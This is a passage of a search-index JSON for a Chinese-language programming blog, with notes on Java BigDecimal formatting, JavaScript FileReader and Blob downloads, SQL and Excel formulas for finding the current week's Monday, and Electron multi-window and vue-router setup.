長度會變成負號","uri":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/"},{"categories":["Java"],"content":"完美方案 new BigDecimal(\"100.000\").stripTrailingZeros().toPlainString() bigdecimal去除末尾多餘的0 ,stripTrailingZeros()科學計數法解決_人生最遺憾的莫過於：輕易地放棄了不該放棄的,固執地堅持了不該堅持的-CSDN博客_striptrailingzeros BigDecimal是處理高精度的浮點數運算的常用的一個類 當需要將BigDecimal中保存的浮點數值打印出來，特別是在頁面上顯示的時候，就有可能遇到預想之外的科學技術法表示的問題。 一般直接使用 BigDecimal.toString()方法即可以完成浮點數的打印。 如： System.out.println( new BigDecimal(\"10000000000\").toString()); 但是，toString()方法輸出的字符串並不能保證不是科學計數法。 不過在日常的使用中，用toString()方法輸出的就是普通的數字字符串而非科學計數法。 直接這麼寫： System.out.println( new BigDecimal(\"100.000\").toString()); 程序的輸出即為： 100.000 如果我們希望去除末尾多餘的0，那麼我們應該這麼寫： System.out.println( new BigDecimal(\"100.000\").stripTrailingZeros().toString()); 其中，stripTrailingZeros()函數就是用於去除末尾多餘的0的，但是此時程序的輸出為： 1E+2 是科學計數法，可能並不是我們想要的。 解決的方法很簡單，如果想要避免輸出科學計數法的字符串，我們要用toPlainString()函數代替toString()。如： System.out.println( new BigDecimal(\"100.000\").stripTrailingZeros().toPlainString()); 此時程序的輸出就為 100 ———————————————— 版权声明：本文为CSDN博主「树上的疯子^」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/xingxiupaioxue/article/details/78088337 相關文章 BigDecimal類型去除多余的小數點和小數點後的0 - IT閱讀 ","date":"2021-11-07","objectID":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/:1:1","tags":["java","bigdecimal"],"title":"BigDecimal.intValue 超過 int 長度會變成負號","uri":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/"},{"categories":["Java"],"content":"別的方案 BigDecimal截取整数位放弃小数位，不进位_雪落南城的博客-CSDN博客_bigdecimal截取整数 截取到整数位 可以先除1000保留到个位 然后再乘1000这样 例： 9.9 截取整数位后 9 代码： BigDecimal c1 = BigDecimal.valueOf(99400).divide(BigDecimal.valueOf(10000), 0, BigDecimal.ROUND_DOWN); 或者 BigDecimal c2 = BigDecimal.valueOf(9.9).setScale(0, BigDecimal.ROUND_DOWN); BigDecimal c3 = BigDecimal.valueOf(9.1).setScale(0, BigDecimal.ROUND_FLOOR); BigDecimal c4 = BigDecimal.valueOf(9.9).setScale(0, BigDecimal.ROUND_FLOOR); 输出：都为9 ———————————————— 版权声明：本文为CSDN博主「雪落南城」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/lbh199466/article/details/100664670 ","date":"2021-11-07","objectID":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/:2:0","tags":["java","bigdecimal"],"title":"BigDecimal.intValue 超過 int 長度會變成負號","uri":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/"},{"categories":["Java"],"content":"JDK7 BUG(雷) java.math.BigDecimal.stripTrailingZeros 对0的处理时注意了 - 成诺 - 博客园 java - represent BigDecimal without decimal part as integer - Stack Overflow ","date":"2021-11-07","objectID":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/:3:0","tags":["java","bigdecimal"],"title":"BigDecimal.intValue 超過 int 長度會變成負號","uri":"/blog/posts/BigDecimal-intValue-%E8%B6%85%E9%81%8E-int-%E9%95%B7%E5%BA%A6%E6%9C%83%E8%AE%8A%E6%88%90%E8%B2%A0%E8%99%9F/"},{"categories":["JavaScript"],"content":"想畫個圖，有時候過很久再回來看這個就忘記怎麼用，但想簡單使用所以用 sequenceDiagram 來描述內容，哈哈，懶得自己畫圖描述。 sequenceDiagram JavaScript-\u003e\u003eJavaScript: 建立new FileReader(); JavaScript-\u003e\u003eJavaScript: 建立 input_file change 事件。 JavaScript-\u003e\u003eJavaScript: 建立 fileReader load 事件。 HTML--\u003e\u003eJavaScript: 人為出發HTML input(file)檔案，會觸發file change Event JavaScript--\u003e\u003eJavaScript: 觸發 input change 事件! participant JavaScript Note right of JavaScript: 使用 fileReader.readAs*(this.files[0])事件讀第一個files[0]，會出發filereader load Event Note right of JavaScript: 這邊的 readAs* 圖片要用 readAsDataURL，文字要用 readAsText。 JavaScript--\u003e\u003eJavaScript: 觸發 load 事件! Note right of JavaScript: 使用 this.result 讀出檔案內容 \u003cinput id=\"fileUploader\" type=\"file\" /\u003e \u003cdiv\u003e圖片預覽：\u003c/div\u003e \u003cimg id=\"imageView\" src=\"\" style=\"width:200px; height200px;\" /\u003e var fileUploader = document.getElementById(\"fileUploader\"); var imageView = document.getElementById(\"imageView\"); //用來讀取file資料的FileReader var fileReader = new FileReader(); //監控#fileUploader的值變化 fileUploader.addEventListener(\"change\", function(event) { if (this.files.length \u003e 0) { //有選取file時，使用fileReader讀取file資料 //readAsDataURL可以將讀取到的file資料轉成 //data:......的URL型式 fileReader.readAsDataURL(this.files[0]); }else{ //沒有選取file時，例如選擇取消， //將\u003cimg\u003e的src設成\"\" imageView.src = \"\"; } }, false); fileReader.addEventListener(\"load\", function(event) { //讀取後設定\u003cimg\u003e的src imageView.src = this.result; }, false); 參考:生活記事簿: 使用FileReader讀取file資料 - javascript ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:0:0","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"FileReader.readas* 下述方法可以將 File / Blob 物件轉換成 TypedArray FileReader.readAsArrayBuffer()：以 TypedArray 的方式顯示檔案內容。 FileReader.readAsDataURL()：以 data:\u003cMIME Type\u003e;base64,… 的方式顯示檔案內容，讀取的資料是圖檔的話會轉成 Base64，**可以直接用於 \u003cimg src=\"BASE_64\"\u003e 中；讀取的資料是 CSS 等若無法直接辨識的檔案類型，會轉成 application/octet-stream 的 Base 64 檔案。 FileReader.readAsText()：以純文字的方式顯示檔案內容，預設是 UTF-8。 FileReader.readAsBinaryString()：以原始二進制顯示檔案內容。 ⚠️ 這個 DataURL 取得的字串不能直接進行 Base64 解碼，必須把前綴 data:/;base64, 從字串裡刪除以後，再進行解碼。 上面範例是使用FileReader.readAsDataURL()放到圖片去，要讀取文字要用FileReader.readAsText() 詳細可以看: [WebAPIs] Blob, File 和 FileReader | PJCHENder 未整理筆記，裡面有一堆寶。 最近用 Vue 元件做讀檔動作有參考: Creating a Vue.js File Reader Component Using the FileReader API | DigitalOcean，順便改個可以客製內容，可以參考匯入匯出基本功能 · malagege/vue-myanimelist@68ba651 · GitHub。 ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:1:0","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"Blob // new Blob(array [, options]) // - array 是字元串或二進位物件（ArrayBuffer, ArrayBufferView, Blob, DOMString） // - options 用來指定 MIME Type var htmlFragment = '\u003cdiv\u003e\u003ch1\u003eHello Blob\u003c/h1\u003e\u003c/div\u003e'; var htmlBlob = new Blob([htmlFragment], { type: 'text/html' }); // Blob {size: 30, type: 'text/html'} 比較特別建構時候用 array 去組，有 type,size 屬性可以用。 ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:2:0","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"files[0] ==\u003e blob 簡單說，event.target.files[0]可以放在程式裡面當變數，帶入fileReader 使用。 MDN文件 File - Web APIs | MDN ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:3:0","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"儲存 Blob（createObjectURL） function saveData(blob, fileName) { const a = document.createElement('a'); document.body.appendChild(a); a.style = 'display: none'; // 將 blob 放到 URL 上 let url = window.URL.createObjectURL(blob); a.href = url; a.download = fileName; a.click(); // 釋放記憶體 a.href = ''; window.URL.revokeObjectURL(url); } 可以用來下載存文字，或實務上做 JSON 匯出動作，可以參考匯入匯出基本功能 · malagege/vue-myanimelist@68ba651 · GitHub。 這邊下載功能我參考: [WebAPIs] Blob, File 和 FileReader | PJCHENder 未整理筆記，改個程式修正就能正常使用。 ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:4:0","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"createObjectURL 可以給與 Blob 物件，可以用blob://連結，實作認知會比較快。可以在 console.log輸入下程式碼。 var htmlFragment = '\u003cdiv\u003e\u003ch1\u003eHello Blob\u003c/h1\u003e\u003c/div\u003e'; var htmlBlob = new Blob([htmlFragment], { type: 'text/html' }); window.URL.createObjectURL(htmlBlob); // 'blob:chrome://new-tab-page/a0d1ce2f-3d38-46f5-ba72-27c91a76a226' 更多內容可以看HTML5 神奇的 Object URL：不用後端，前端便能產生獲取指定物件的網址 | by 柯政祥 (Zheng-Xiang Ke) | Medium。 ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:4:1","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"Blob 其他相關 ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:5:0","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"Blob 怎麼用 Form(網頁表單) 傳資料 var formData = new FormData(); formData.append(\"name\", blob, filename); Blob 變數可以放入 event.target.files[0] 參考:javascript - What is the form input type for posting blob from an HTML Form? - Stack Overflow 詳細可以看 MDN 文件 FormData.append() - Web APIs | MDN，有兩種放入 FormData 方法。 ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:5:1","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"Blob 播放影片相關 原本在想這個有甚麼好處，但看到網路上有提到這個是邊下載邊播放影片，但我映像中 video mp4 好像能這樣做，但不確定是不是其他格式不行? 关于blob - 知乎 MediaSource的使用以及封装MP4转加载Blob的插件 - Postbird - 猫既吾命 ","date":"2021-11-07","objectID":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/:5:2","tags":["javascript","filereader","blob"],"title":"JS 使用 FileReader 讀取檔案方法和下載檔案(Blob)方法","uri":"/blog/posts/JS-%E4%BD%BF%E7%94%A8-FileReader-%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%E5%92%8C%E4%B8%8B%E8%BC%89%E6%AA%94%E6%A1%88-Blob-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"最近維運常常每周都用SQL抓前一個禮拜內容，日期都是手動調整，長久下來都會怕忘記調整，最近再找有什麼方法可以抓到當周的禮拜一，爬文還真的有找到，趕快紀錄下來。 ","date":"2021-11-07","objectID":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:0:0","tags":["sql"],"title":"用 SQL 抓出當周星期一日期方法","uri":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"MySQL SELECT DATE_ADD(CURDATE(), INTERVAL - WEEKDAY(CURDATE()) DAY) select date(curdate() - interval weekday(curdate()) day) 參考:MySQL: select date of current week’s monday | Newbedev ","date":"2021-11-07","objectID":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:1:0","tags":["sql"],"title":"用 SQL 抓出當周星期一日期方法","uri":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"前一個禮拜一 select date(curdate() - interval weekday(curdate()) day - interval 1 week) ","date":"2021-11-07","objectID":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:1:1","tags":["sql"],"title":"用 SQL 抓出當周星期一日期方法","uri":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"番外 If you count Monday as the first day of the week: SELECT STR_TO_DATE(CONCAT(YEARWEEK(NOW(), 1),'Monday'), '%x%v %W'); If you count Sunday as the first day of the week: SELECT STR_TO_DATE(CONCAT(YEARWEEK(NOW()),'Monday'), '%X%V %W'); ","date":"2021-11-07","objectID":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:1:2","tags":["sql"],"title":"用 SQL 抓出當周星期一日期方法","uri":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"Oracle select trunc(sysdate,'IW') from dual; 參考:First Date of Week(Monday Date) - Ask TOM 比較有趣這邊是用 ISO 日期，ISO 日期第一天是 Monday ， ","date":"2021-11-07","objectID":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:2:0","tags":["sql"],"title":"用 SQL 抓出當周星期一日期方法","uri":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"Excel The following will display the dates for Monday, Wednesday and Friday of the current week: =NOW() - WEEKDAY(NOW(),3) =NOW() - WEEKDAY(NOW(),3)+2 =NOW() - WEEKDAY(NOW(),3)+4 Sunday of this current week: =1-WEEKDAY(TODAY())+TODAY() Monday of this current week: =2-WEEKDAY(TODAY())+TODAY() Tuesday of this current week: =3-WEEKDAY(TODAY())+TODAY() Wednesday of this current week: =4-WEEKDAY(TODAY())+TODAY() Thursday of this current week: =5-WEEKDAY(TODAY())+TODAY() Friday of this current week: =6-WEEKDAY(TODAY())+TODAY() Saturday of this current week: =7-WEEKDAY(TODAY())+TODAY() SUNDAY of following week, when Monday \u0026 not Sunday is used as day #1 of week: =8-WEEKDAY(TODAY())+TODAY() Also, if you change the format of the cell to a custom format and choose DDD it will display Fri or Mon and if you use DDDD it will display Friday or Monday, etc. 這邊看到覺得滿有趣，先記錄How to get the dates of the current monday, wednesday and friday of the current week in excel? - Super User ","date":"2021-11-07","objectID":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:3:0","tags":["sql"],"title":"用 SQL 抓出當周星期一日期方法","uri":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"PostgreSQL SELECT current_date - ((6 + cast(extract(dow FROM current_date) AS int)) % 7) postgresql - Get this week’s monday’s date in Postgres? - Stack Overflow ","date":"2021-11-07","objectID":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/:4:0","tags":["sql"],"title":"用 SQL 抓出當周星期一日期方法","uri":"/blog/posts/%E7%94%A8-SQL-%E6%8A%93%E5%87%BA%E7%95%B6%E5%91%A8%E6%98%9F%E6%9C%9F%E4%B8%80%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"最近發生蠢事，我原本看到網路上使用 Electron 可以用 Browserwindow 控制視窗內容，但我發現網路方法竟然都失效，結果我爬到一篇發現是我犯蠢了，vue electron 创建子窗口后内容和父窗口一样 配置vue-router无效？ - SegmentFault 思否跟裡面作者一樣忘記加 \u003crouter-view\u003e。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-%E4%BD%BF%E7%94%A8-vue-router-%E9%96%8B%E5%95%9F%E8%A6%96%E7%AA%97%E6%96%B9%E6%B3%95/:0:0","tags":["electron"],"title":"Electron 使用 vue router 開啟視窗方法","uri":"/blog/posts/Electron-%E4%BD%BF%E7%94%A8-vue-router-%E9%96%8B%E5%95%9F%E8%A6%96%E7%AA%97%E6%96%B9%E6%B3%95/"},{"categories":["Nodejs"],"content":"Electron 設定 vue-router 開啟視窗方法 vue-router 改成 hash模式 設定 Browserwindow.loadURL const pageUrl = import.meta.env.MODE === 'development' \u0026\u0026 import.meta.env.VITE_DEV_SERVER_URL !== undefined ? import.meta.env.VITE_DEV_SERVER_URL+`#/${hash || ''}${urlParam}` : new URL(`../renderer/dist/index.html#/${hash || ''}${urlParam}`, 'file://' + __dirname).toString(); notifyWindow.loadURL(pageUrl); \u003crouter-view\u003e\u003c/router-view\u003e，很多教學沒有這段，但漏這段就是出不來XD 相關程式可以看修改成 router · malagege/vue-electron-Pomodoro@5786989 · GitHub ","date":"2021-11-07","objectID":"/blog/posts/Electron-%E4%BD%BF%E7%94%A8-vue-router-%E9%96%8B%E5%95%9F%E8%A6%96%E7%AA%97%E6%96%B9%E6%B3%95/:1:0","tags":["electron"],"title":"Electron 使用 vue router 開啟視窗方法","uri":"/blog/posts/Electron-%E4%BD%BF%E7%94%A8-vue-router-%E9%96%8B%E5%95%9F%E8%A6%96%E7%AA%97%E6%96%B9%E6%B3%95/"},{"categories":["Electron"],"content":"最近實作new Browserwindow()多視窗後，關閉原本猜考程式使用app.close()，結果發現程式每一個都會關閉，但不知道要怎麼處理，後來有爬到【Electron Playground 系列】窗口篇 - SegmentFault 思否 有講多視窗問題。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/:0:0","tags":["electron","nodejs"],"title":"Electron 開請新視窗後處理多視窗問題","uri":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/"},{"categories":["Electron"],"content":"所有多視窗觸發程式關閉 app.on('window-all-closed', () =\u003e { if (process.platform !== 'darwin') { app.quit(); } }); 其實原本程式就有帶進這個 function，所以所有 browserwindow 關掉會做app.quit()。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/:1:0","tags":["electron","nodejs"],"title":"Electron 開請新視窗後處理多視窗問題","uri":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/"},{"categories":["Electron"],"content":"處理多視窗方法 裡面有提到【Electron Playground 系列】窗口篇 - SegmentFault 思否，browserwindow有各自id，建立 browserwindowMap 紀錄所有browserwindow.id，針對關閉對應所有 id 做特別處理動作。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/:2:0","tags":["electron","nodejs"],"title":"Electron 開請新視窗後處理多視窗問題","uri":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/"},{"categories":["Electron"],"content":"我想到比較完美作法 IpcMain 方法做關閉 Electron 動作，我原本在想上面要怎麼串我的程式，但又覺得上面寫的好麻煩，爬文也找不到更好的方案，最後我想到一個比較好的做法。 window.close() 沒錯，就這麼簡單，哈哈。上面提到window-all-closed所有 browserwindow 關閉會做app.quit()動作。所以不用管 browserwindow是什麼，但網路上沒有人寫這個方法，不知道有沒有安全性問題，但目前我評估應該是不會。 調整程式範例:解決多視窗關閉問題 · malagege/vue-electron-Pomodoro@f71d5b1 · GitHub ","date":"2021-11-07","objectID":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/:3:0","tags":["electron","nodejs"],"title":"Electron 開請新視窗後處理多視窗問題","uri":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/"},{"categories":["Electron"],"content":"但發現 縮小/放大無法用 window 做到 目前沒有找到方法，網路有很多使用 remote 方法，不過新版好像因為安全性就不能使用。我目前想說子視窗就不做放大縮小按鈕，哈哈。目前只有想到單一window 特別做設定，沒有想到動態視窗一致方法，有想到好方法就補上。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/:4:0","tags":["electron","nodejs"],"title":"Electron 開請新視窗後處理多視窗問題","uri":"/blog/posts/Electron-%E9%96%8B%E8%AB%8B%E6%96%B0%E8%A6%96%E7%AA%97%E5%BE%8C%E8%99%95%E7%90%86%E5%A4%9A%E8%A6%96%E7%AA%97%E5%95%8F%E9%A1%8C/"},{"categories":["Nodejs"],"content":"大部分教學都不太一樣，後來發現 Electron-builder 的 Autodater 跟 Electron 的 Autoupdater 不太一樣。Electron 內建必須做 codesign 簽章，但不知道能不能用 mkcert ，但感覺不太能做的樣子。avast 一直對我build 出來 msi,exe 做掃描，聽說 codesign 能改善這個問題? codesign 感覺也是大坑，這篇先主要把我網路上整理資料先為主，先以 electron-builder為主。 ","date":"2021-11-07","objectID":"/blog/posts/Electron-Autoupdater-%E7%A8%8B%E5%BC%8F%E8%87%AA%E5%8B%95%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95-GITHUB-%E6%9B%B4%E6%96%B0%E6%96%B9%E6%B3%95/:0:0","tags":["electron","autoupdater","github","action"],"title":"Electron Autoupdater 程式自動更新方法 \u0026 GITHUB 